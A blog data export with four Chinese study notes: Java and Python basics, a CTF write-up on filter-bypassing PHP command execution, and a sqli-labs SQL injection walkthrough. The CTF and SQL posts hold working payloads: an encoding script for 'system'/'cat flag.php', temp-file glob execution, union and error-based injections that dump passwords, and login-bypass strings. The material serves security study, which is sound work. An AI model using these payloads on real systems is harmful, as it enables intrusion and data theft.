[{"title":"java learn 1","url":"/2025/08/20/java-learn%201/","content":"java 基础多写（代码） 多写（笔记） 多写（文章）多练（交流） 多练（思维） 多练（技能）多分享（知识） 多提问（怎么了） 多思考（为什么）什么是计算机能够按照程序运行、自动、高速处理海量数据的现代化智能电子设备\n由硬件和软件所组成\ndos命令执行台小技巧shift+鼠标点击在此处打开命令执行窗口\ndir查看目录\n切换目录 cd change directory\ncls 清理屏幕\nipconfig查看电脑的ip(window11用不了)\nping+url命令查看网络连接状态\nmd 目录名 #创建\nrd 目录名 #删除\ncd 文件名  #cd ..回到上一级#cd&gt;创建\ndel 文件名# 删除\nHelloWorldpublic class Hello&#123;    public static void main(String[] args)&#123;        System.out.print(&quot;hello,World&quot;);    &#125;&#125;\n\nVisual Code可以直接运行\n还有javac编译生成class文件后运行的方法\n可能遇见的情况1.每个单词的大小写不能出现问题java是大小写敏感的\n2.尽量使用英文；\n3.文件名一定要和类名保持一致\n4.符号使用了中文\n外边是一个类里面是一个方法\nJava开发环境java程序运行机制编译型：将我们的代码解释成计算机能够执行的形式执行速度很快#操作系统\n解释型：像一个翻译官，编译一句翻译一句，对执行速度要求没有那么高#网页\njava源文件到class文件就是编译的过程\n\nJava的基础语法注释//123123#单行注释/*2131231*/#多行注释/***@Description HelloWorld*@Author*/#文档注释\n\n标识符所有标识符都应该以字母美元或者下划线开始\n首字母之后可以是字母美元符下划线或数字的任何字符组合\n标识符是大小写敏感的\n可以是中文\n数据类型强类型语言要求变量的使用要严格符合规定所有变量都必须先定义后使用\n八大基本数据类型&#x2F;&#x2F;整数\nint num1&#x3D;10;最常用\nbyte num2&#x3D;20;\nshort num3&#x3D;30;\nlong num4 &#x3D;30L;Long类型要中数字后面加个L\n&#x2F;&#x2F;小数\nfloat num5 &#x3D; 50.1F; Lfloat 类型要在数字后面加个F\ndouble num6&#x3D;3.141592391293；\n&#x2F;&#x2F;字符\nchar name&#x3D;’国’\n&#x2F;&#x2F;字符串\nString不是关键字，类\n&#x2F;&#x2F;布尔值：是非\nboolean flag &#x3D;true;\n整数拓展： 进制二进制0b 十进制 八进制0  十六进制0x\nint i =10;int i2 =010;//八进制0int i3 = 0x10;//十六进制0x  0~9 A~F 16System.out.println(i);System.out.println(i2); \n\n浮点数扩展//BigDecimal 数学工具类//float   有限 离散  含入 误差 大约 接近但不等于//最好完全避免使用浮点数进行比较float f = 0.1f; //0.1  double d =1.0/10;//0.1System.out.println(f==d);//falsefloat d1 =23111132123123123123123f;float d2 =d1+1;System.out.println(d1==d2);//true\n\n字符拓展char c1 &#x3D;’a’;\nchar c2 &#x3D; ‘中’\nSystem.out.println(c1);\nSystem.out.println((int)c1);&#x2F;&#x2F;强制转换\n&#x2F;&#x2F;所有的字符本质还是数字\nchar c3 &#x3D;’\\u0061’;\nSystem.out.println(“c3”);&#x2F;&#x2F;a\n&#x2F;&#x2F;编码 Unicode 表：（97&#x3D;a 65&#x3D;A）\n&#x2F;&#x2F;转义字符\n&#x2F;&#x2F;\\t 制表符\n&#x2F;&#x2F;\\n 换行\n&#x2F;。。。\n布尔值拓展boolean flag&#x3D;true；\nif(flag&#x3D;&#x3D;true){}&#x2F;&#x2F;新手\nif (flag){}&#x2F;&#x2F;老手\n类型转换低到高\nbyte,short,char→int→long→float→double\npublic class Demo06&#123;    public static void main(String[] args)&#123;    //操作比较大的数的时候，注意溢出问题    //JDK7新特性，数字之间可以用下划线分割    int money = 10_0000_0000;    int years =20;    int total =money *years;//-1474836480,计算的时候溢出了    long total2 = money*years;    long total3 =money*((long)years);        System.out.print(&quot;total3&quot;);    &#125;&#125;/*注意点1.不能对布尔值进行转换2.不能把对象类型转换为不相干的类型3.在把高容量转换到低容量的时候，强制转换4.转换的时候可能存在内存溢出，或者精度问题*/\n\n&#x2F;&#x2F;强制转换 （类型）变量名 高到低\n&#x2F;&#x2F;自动转换  低到高\n变量java是一种强类型语言，每个变量都必须声明其类型\njava变量是程序中最基本断点存储单元，其要素包括变量名，变量类型和作用域\npublic class Demo08&#123;//属性：变量//类变量//实例变量：从属于对象：如果不自行初始化，这个类型的初始值//布尔值：默认是false//除了基本类型其余的默认值都是null//main方法String name;int age;  public static void main(String[] args)&#123;  //局部变量：必须声明和初始化值  int i =10;  System.out.println(i);  //变量类型 变量名字 = new Demo08()  Demo08 demo08 = new Demo08()  System.out.println(demo08.age);    System.out.println(demo08.name);  &#125;&#125;\n\n","tags":["java"]},{"title":"无字符数字RCE","url":"/2025/08/20/%E6%97%A0%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97RCE/","content":"无字母数字rce1.临时文件上传 原理：无字母数字要实现远程指令操作，也就是要想办法绕过网站过滤的指令，而通过post上传文件（和文件夹tmp联系一起，把指令直接在网站内的tmp中执行绕过了过滤的环节）此时php会在Linux里的临时文件夹保存文件，且文件一定是php加上6个随机的字符，6个随机字符会出现大写的情况，文件的位置是&#x2F;tmp&#x2F;php??????。根据6个字符会出现大写的情况，我们在编辑访问的时候要确保我们提交的东西被执行也就是匹配问题。无字母数字的条件下我们一般会使用glob通配符”？”去解决也就是**. &#x2F;???&#x2F;?????????(. &#x2F;tmp&#x2F;php??????)【这条指令的含义是php运行这个文件所在位置包含的东西（. &#x2F;表示执行**）】但是后面的9个“？”能够匹配的文件太多了，也就会导致无法执行到我们提交的文件。所以要根据上传文件后六个字符随机出现大写的特性去匹配，\n而glob支持使用类似[0-9]的形式去表达范围，那么类似我们可以查询ASCII码表\n\n可以发现表达所有大写字母可以用[@-[]去表示所以原来的指令写成. &#x2F;???&#x2F;????????[@-[]（表示最后一位字符是大写字母的情况），因为生成的后六位字符大写情况是随机的所以可能需要多次提交去匹配。\n实现临时文件上传构建html页面有关html的知识点1.构建网页的基本结构&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt; &lt;!--对于中文网页需要使用此条声明编码有些浏览器会设置GBK为默认编码--&gt;&lt;title&gt; &lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;/body&gt;&lt;/html&gt;\n\n2.一些常见的标签以及标签知识HTML标题\n&lt;h1&gt; 这是一段标题&lt;/h1&gt;&lt;h2&gt;           &lt;/h2&gt;\n\n\n\nHTML段落\n&lt;p&gt;这是一个段落 &lt;/p&gt;\nHTML链接\n&lt;a href=&quot;链接&quot;&gt;这是一个链接&lt;/a&gt;\nHTML图像\n&lt;img src=&quot;/images/logo.png&quot; width=&quot;258&quot; height=&quot;39&quot; /&gt;\n3.关于标签与元素\nHTML元素以开始标签起始 以结束标签终止。例子：  元素的内容在开始与结束标签之间\n2.构建文件上传网页&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;https://648cc2ce-53dc-47cb-b1b0-8fcdcbf1e724.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n下面代码是对网页做了一个大小的动态调整使得这个网页能够在任何设备上正常显示\n&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\n\nform标签是创建表单，用于用户输入\naction属性是**标签的一个重要组成部分，它定义了当表单提交时，表单数据应该发送到哪里。这个属性的值可以是一个文件名，处理表单数据的脚本，或者是一个服务器的URL。\nenctype属性‌用于规定表单数据在发送到服务器之前如何进行编码。它主要有三个取值：\n1.application&#x2F;x-www-form-urlencoded：这是默认的编码方式，表单数据被编码为名称&#x2F;值对（即键值对），适用于大多数常规的表单提交。在这种编码方式下，所有字符都会进行编码，空格被编码为“+”号，特殊字符被编码为ASCII十六进制值‌12。\n2.‌multipart&#x2F;form-data‌：这种编码类型用于文件上传。表单数据被编码为一条消息，每个控件对应消息中的一个部分。这种编码方式不对字符进行编码，适用于包含文件上传控件的表单。使用这种编码方式时，必须配合POST方法提交表单‌12。\n3.‌text&#x2F;plain：表单数据以纯文本形式进行编码，不含任何控件或格式字符。这种编码方式较少使用‌\nlabel属性是一个标签为为 input 元素定义标注（标记）”for” 属性可把 label 绑定到另外一个元素。把 “for” 属性的值设置为相关元素的 id 属性的值。\ninput的功能取决于type，type&#x3D;file定义文件选择字段和 “浏览…” 按钮，供文件上传。\ntype&#x3D;submit定义提交按钮。\n3.burp截取上传请求并修改添加指令先ls查询当前目录文件 下图是ctfshow web56时添加的指令作为参考\n\n没有出现结果多发送几次原理上面有解释。\n思路：以下三种都是直接通过将原来指令一个字母一个字母用字符替换（通过运算公式去实现）的形式\n2.取反原理：每一个字母用“~“取反后得到的url编码再次取反还是它本身\n&lt;?php    $a=urlencode(~&#x27;php&#x27;)    echo $a;    echo &#x27;&lt;/br&gt;&#x27;;    $b=urlencode($a);    echo $b;    \n\n\n\n利用得到的url编码加上取反符号”~”可以绕过一些数字字母过滤\n3.异或这里先了解或运算”||“（”|“）和异或运算”^“\n或运算： 参加运算的两个对象，按二进制位进行“或”运算。\n运算规则：0|0&#x3D;0； 0|1&#x3D;1； 1|0&#x3D;1； 1|1&#x3D;1；即 ：参加运算的两个对象只要有一个为1，其值为1例如: 3|5 可写算式如下： 0000 0011 | 0000 0101 &#x3D; 0000 0111(十进制为7)因此，3|5的值为7。\n这里十进制算出来的可以是ASCII码值所以可以对字符进行运算\n异或运算：参加运算的两个数据，按二进制位进行“异或”运算。\n运算规则：0^0&#x3D;0； 0^1&#x3D;1； 1^0&#x3D;1； 1^1&#x3D;0；即：参加运算的两个对象，如果两个相应位为“异”（值不同），则该位结果为1，否则为0例如：9^5可写成算式如下： 00001001 ^ 00000101 &#x3D; 00001100 (十进制为12)因此，9^5的值为12。\n这里可以参考web42（url编码就是%加上对应字符ASCII码的16进制数）\nimport reimport urllibfrom urllib import parsehex_i = &quot;&quot;hex_j = &quot;&quot;pattern=&#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;  #被过滤的字符str1=[&quot;system&quot;,&quot;cat flag.php&quot;] #需要输出的字母指令for p in range(2):    t1 = &quot;&quot;    t2 = &quot;&quot;    for k in str1[p]:        for i in range(256):#ASCII码表一共256个            for j in range(256):                if re.search(pattern,chr(i)) :#如果有过滤字符跳过一次第一次循环                    break                if re.search(pattern,chr(j)) :#如果有过滤字符跳过一次第二次循环                    continue                if i &lt; 16:                    hex_i = &quot;0&quot; + hex(i)[2:]#hex（）将整数转化为16进制数但是会有0x前缀所以从[2:]开始                else:                    hex_i=hex(i)[2:]                if j &lt; 16:                    hex_j=&quot;0&quot;+hex(j)[2:]                else:                    hex_j=hex(j)[2:]#以上代码都是在筛选可用字符对应的16进制码                hex_i=&#x27;%&#x27;+hex_i                hex_j=&#x27;%&#x27;+hex_j                c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))#或运算然后再转为ASCII码表对应的字母 urlib.parse.unquote()为解码url返回它本身的字符串 ord（）是把字符串变成十进制数 chr是把十进制数变成ASCII码对应字符                if(c ==k):                    t1=t1+hex_i                    t2=t2+hex_j                    break            else:                continue            break    print(&quot;(\\&quot;&quot;+t1+&quot;\\&quot;|\\&quot;&quot;+t2+&quot;\\&quot;)&quot;)\n\n这里就是用到了或运算去绕过字母和数字过滤。\n同理我们也可以用异或的运算符号去替换判断条件\n当然异或也可以直接用符号运算去表示字母\nvar_dump(&#x27;#&#x27;^&#x27;|&#x27;); //得到字符 _`var_dump(&#x27;.&#x27;^&#x27;~&#x27;); //得到字符 P    var_dump(&#x27;/&#x27;^&#x27;&#x27;); //得到字符 0    var_dump(&#x27;|&#x27;^&#x27;/&#x27;); //得到字符 S    var_dump(&#x27;&#123;&#x27;^&#x27;/&#x27;); //得到字符 T    $__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);  //变量$__值为字符串&#x27;_POST&#x27;\n\n\n\n\n\n\n\n4.自增$_++&#x3D;1因为在没有给定初值的情况下运行时会认问是false&#x3D;0然后再自增得到1 那么利用自增函数只要‘A’我们就可以用字符拿到所有的字母\n在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array\n这里面就有A\np神的构造\n&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#xn\n但是这个构造太长了局限性很大不是很好用，了解即可。\n","tags":["rce"]},{"title":"python learn","url":"/2025/08/22/python-learn/","content":"PythonPython 是一种面向对象对的解释型计算机程序设计语言\nPython 是强类型的动态脚本语言\nBugSyntaxError:语法编写错误\nIndentationError：缩进错误\nNameError:命名错误\nDebug设置断点调试\n蓝色是即将运行的的代码\nshow Execution Point 显示执行的断点\nStep into 下一步\nRun to Cursor 跳到下一个断点断点位置 \nEvaluate 用于计算\n可以通过断点的调试看到程序执行的顺序\n输出print(&quot;sjda&quot;,&quot;sdas&quot;,&quot;asda&quot;)#输出三句话print(&quot;&quot;,&quot;&quot;,&quot;&quot;,sep=&#x27;,&#x27;)#添加分隔符print(&quot;&quot;,end=&quot;&quot;)#改变end的方式默认是换行符\n\n变量变量：计算机中的存储空间，用于保存数据\n变量名&#x3D;变量值#等号是赋值运算符\n引号内是字符串，没有引号会被识别成变量名\na=666#解释器做了两件事#在内存中创建了一个666的数据#创建了一个变量a，把666这个数据保存到a变量中去同一变量可以反复赋值print(a)#666a=999print(a)#999\n\n标识符程序员定义的变量名、函数名\n只能由数字、字母、_（下划线）组成\n标识符被包含在（）内对标识符本身没有 影响\n不能是关键字#关键字python 中已经使用的标识符，具有特殊的功能和含义\n变量的命名规范下滑线分割法：多个单词组成的名称，使用小写字母，单词与单词之间使用下划线分开\n数值类型int 整形：任意大小的整数\nnum&#x3D;1\nprint（type（num））\nfloat浮点数：小数\nnum2&#x3D;1.5\nbool布尔型\n有固定写法一个为True 一个为False\nTrue和False必须严格区分大小写\n布尔值可以当作整形对待True相当于整数1，False相当于整数0\ncomplex复数型\n固定写法z&#x3D;a+bj –a是实部 b是虚部 j是虚数单位\n字符串str\n特点需要加上引号，单引号双引号都可以，包含多行内容可以用三引号\n%s占位\nname&#x3D;’bing’\nprint(“我的名字：%s”% name)\n%d整数\nage&#x3D;18\nname&#x3D;’bing’\nprint(“我的名字：%s,年龄：%d”%(name,age))\n%f浮点数\n输出%%\nprint(“我是%%的1%%”%（）)\n格式化输出\nf”{表达式}”\nname&#x3D;‘’\nage&#x3D;‘’\nprint(f”我的名字{name},年龄{age}”)\nif-else判断age=21if age&lt;18:  print(&#x27;爬&#x27;)\n\ninput内默认是字符串\n逻辑运算符\nand与\nor或\nnot非\n#else后面不需要添加任何条件\nif-elifif-else二选一 if-elif 多选一\nwhile循环while 循环条件：\nfor循环for 临时变量 in 可迭代对象\nrange()用来记录循环次数相当于一个计数器字符串编码UTF-8编码，对不同字符用不同的长度来表示\n","tags":["python"]},{"title":"sql注入","url":"/2025/08/25/sql%E6%B3%A8%E5%85%A5/","content":"sqli-labs通关1.联合注入（less 1）1.注入点是否存在 即是否有闭合报错,输入id&#x3D;1‘\n2.利用注释符号–+\n3.利用order by 函数观察查询表的列数\n4.查询后利用联合注入爆出注入点\n5.执行恶意查询指令database()\n6.查询该库下的所有表名group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+\n\n7.查询列名\ngroup_concat(column_name) from information_schema.columns where table_name&#x3D;’user’–+\n\n8.查询列里的字段\n\n2.less 2 (数字型注入只有在开头检测有差别)\n\n\n\n直观感受下原代码是 “i’（less1也就是字符型这里需要读取封闭符号取字符串）\n\n\n\nless2 你不管怎么去改它的数字都不会发生变化但是你改封闭符号个数会跳出来再进一步探索\n\n你就会发现它根本不识别字符串这里跳出来数字了所以这里一定读取的是值那就不能出现封闭的情况不然就会被识别为字符串\n一些帮助理解的知识点在MySQL中，把 information_schema  看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。**select：用于指定查询中要返回的字段，如部分已有字段、全部字段（*）、新增计算字段from：**指定查询的数据来源，即表名**where：**用于过滤数据，根据指定的条件排除不符合条件的行**group by：**对字段进行分组聚合，通常与聚合函数一起使用，以便对每个组执行统计或计算**having：**对分组后的结果进行过滤，适用于基于聚合函数的条件筛选**order by：**对查询结果进行排序，可以指定排序的列默认升序，降序要加desc**limit：**限制查询返回的行数，如limit n返回前n行、limit m,n返回m+1到m+n行这里解释了为什么在最后拼接字符段不再需要where的出现，也解释了为什么在from中不需要‘’而where需要的原因。\n3.less3依旧是新的报错需要猜测它原来的查询语句\n\n这里应该是（’i’)其他运用联合注入就可以了\n4.less4\n\n差报错推测原输入为(‘“i”)所以输入要是1”)–+\n接着利用联合注入即可\n5.less 5（报错注入即双注入）无回显点利用group by函数特性创造回显点没有可利用回显点需要学习新东西\nhttps://www.freesion.com/article/9958528915/\n原理：子查询在查询进行时子查询是优先进行的\n\nRand() &#x2F;&#x2F;随机函数，用于产生 0 至 1 之间的随机数\n\nFloor() &#x2F;&#x2F;取整函数，向下舍入为指定小数位数 如：floor(1.45,0)&#x3D; 1;floor(1.55,0) &#x3D; 1\n\nCount() &#x2F;&#x2F;汇总函数\n\nGroup by clause &#x2F;&#x2F;分组语句（利用函数特性）简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用 Group by 分组语句就会把查询的一部分以错误的形式显示出来。\n\n\n\n\n深层次的原因：通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)**2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。）group by  floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。\n结论是：当与临时表里面的值进行比较，如果不同，就插入，但是插入的时候又计算了一次，所以如果插入时计算的值与直接比较的值不一样，则报错！\n\n参考他人博客\n自我总结：可以理解为在group by 读取数据并且保存在临时表的过程中由于floor（random(0)*2）会出现0和1的性质那么在检测时就会出现security0和security1但是在写入临时表的过程中又被计算了一遍也就是说security0写入可能变成security1，那这时候就重复了，重复就会报错告诉你security1重复了那你也就得到了数据库名了。注意的是可能也就是说有时候需要多次刷新才会显示\n套路公式\npayload：?id=-1&#x27; union select count(*),2,concat((select database()),&#x27;*&#x27;,floor(rand()*2))as a from information_schema.tables group by a--+ 这里把查询库的名字命名为a\n\n（这里是需要修改limit的比如limit 1，1 limit 2，1然后一个个去看这里会比较麻烦一些）\n把最终的payload放出来看眼\n?id=-1&#x27; union select count(*),2,concat(&#x27;*&#x27;,(select concat_ws(char(32,44,32),id,username,password) from users limit 1,1),&#x27;*&#x27;,floor(rand()*2))as a from information_schema.tables group by a--+  \n\n\n\n5.less6，9，10（延迟注入法也是报错注入的一种时间盲注）上面的报错注入一样可以用利用sleep（）函数去看漏洞\nhttps://blog.csdn.net/qq_68357559/article/details/137127366\n这个博客里介绍的就可以但是比上面的还要麻烦这个需要利用if函数和sleep函数去尝试出库和表的ASCII码值等于要看你页面延迟然后一个个试很麻烦\n这里我看了另外一种不是利用if函数\n报错注入最全链接https://blog.csdn.net/haishiqiguai/article/details/147591123（写的确实豪）5.less6报错注入updatexml（）函数版https://blog.csdn.net/haishiqiguai/article/details/147591123\n利用updatexml函数\n6.Less7 导出文件GET字符型注入这个是纯试出来的?id&#x3D;1’))–+\n然后用and测试length（database()）测出来是9\n\n然后甚至可以用substr（）一点点爆字母 and substr(database(),1,1)&#x3D;’s’\n这里用导入文件的方式\n用到两个函数 要去前面几关去获取\nbasedir()指定了安装MYSQL的安装路径\ndatadir()指定了安装MYSQL的数据文件路径\n\n:D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\\nD:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\\n\n放个payload吧页面回显失败但是我的文件夹里还是没有出现hack.php失败了，\n这里下一步直接连接蚁剑就可以了。\n7.Less-8，9，10和上面一样用substr一个个爆https://blog.csdn.net/qq_43531669/article/details/96746687\n这篇博客就是专门爆的里面还附带了脚本避免了手工注入的繁复\n8.Less-11Post注入万能密码 admin’ and true# 或者 admin’ or 1&#x3D;1#\n登录成功以后联合查询即可\nless12和上面一样只是改成了(“i”)\n\nless13 password是注入点万能密码123’) or 1&#x3D;1# 这个是无回显爆破相当恶心\nless14和上题一样less15时间延迟但是还是爆破总结感觉sql其实挺公式化的无回显点的时候甚至可以无脑爆破\n也学到挺多的无回显注入还得是脚本方便一个个爆真的构式\n","tags":["sql"]}]